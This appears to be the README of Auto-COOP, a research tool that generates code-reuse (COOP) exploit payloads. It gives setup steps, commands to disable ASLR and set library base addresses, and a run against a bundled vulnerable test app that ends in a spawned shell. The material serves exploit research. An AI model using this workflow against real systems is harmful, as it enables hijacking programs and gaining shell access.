Installation
============

To run Auto-COOP, you need a python2 environment with angr and antlr4-python2-runtime installed. We recommend creating a python virtual environment. The steps to set one up with the proper packages are outlined below.

1. create python2 virtualenv using virtualenv, virtualenvwrapper, conda, pipenv, or similar::

    $ virtualenv autocoop

2. enter virtualenv & install requirements::

    source autocoop/bin/activate
    pip install -r requirements.txt

3. make sure that "." is in the $PYTHONPATH::

    export PYTHONPATH=.:$PYTHONPATH


Running Auto-COOP
=================

To generate a payload with Auto-COOP, some setup is required. ASLR has to be disabled, and the exploit generation script has to be updated with the proper base library address for your system. Running the lxs script with everything configured correctly will lead to a call to 'system("/bin/sh")'.

1. disable aslr::

    $ cd exploitable_app
    $ ./disable_aslr.sh

2. run lxs::

    $ cd exploitable_app/testapp
    $ ./run.sh
    [+] allocated buffer at 0xa0000000
    [+] number of parameters supplied 3
    [+] loaded cmake-build-debug/libAPP.so at 0x7ffff7ff2000
    ...

3. update lib base address in exploit_generator.py::

    <Auto-COOP/tool/exploit_generator.py>
    ...
    config = Config("exploitable_app/nodejs/libnode.so",
                      0x7ffff7ff2000, <-- UPDATE THIS
                      0xa0000000,
                      4096,
                      gadget_csv="exploitable_app/nodejs/SDOutput/libnode.so.57-Virtual-metric.csv")
    ...

4. generate the payload::

    $ python autocoop/exploit_generator.py esl_scripts/exploit_system.esl

5. run lxs again::

    $ cd exploitable_app/testapp
    $ ./run.sh
    [+] allocated buffer at 0xa0000000
    [+] number of parameters supplied 3
    [+] loaded cmake-build-debug/libAPP.so at 0x7ffff7ff2000
    [+] fd 3
    [+] execute w00t..
    $

